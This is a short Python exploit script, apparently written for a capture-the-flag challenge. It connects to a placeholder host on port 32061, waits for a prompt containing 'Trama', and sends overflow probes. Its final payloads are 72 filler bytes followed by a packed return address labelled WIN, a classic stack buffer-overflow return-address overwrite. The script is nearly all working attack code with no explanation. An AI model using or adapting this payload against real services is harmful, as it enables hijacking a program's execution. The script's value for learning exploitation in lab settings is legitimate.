#!/usr/bin/env python3
import socket, struct, sys

HOST, PORT = "<host>", 32061
WIN = 0x4018A5

def probe(data, label, wait=2.0):
    s = socket.create_connection((HOST, PORT), timeout=8); s.settimeout(wait)
    buf = b""
    try:
        while b"Trama" not in buf:
            c = s.recv(4096)
            if not c: break
            buf += c
        s.sendall(data)
    except Exception as e:
        buf += b"\n[!] " + str(e).encode()
    try:
        while True:
            c = s.recv(4096)
            if not c: break
            buf += c
    except Exception:
        pass
    s.close()
    out = buf.decode("latin1", "replace")
    print(f"### {label}  (len={len(data)})")
    print(out.replace("\x1b", "ESC"))
    print("-"*70)
    return out

probe(b"A"*32 + b"\n", "32 A + salto")
probe(b"A"*33 + b"\n", "33 A + salto")
probe(b"A"*72 + struct.pack("<Q", WIN), "payload exploit (72 A + win)")
probe(b"256\n" + b"A"*72 + struct.pack("<Q", WIN), "payload completo (256\\n + ...)")
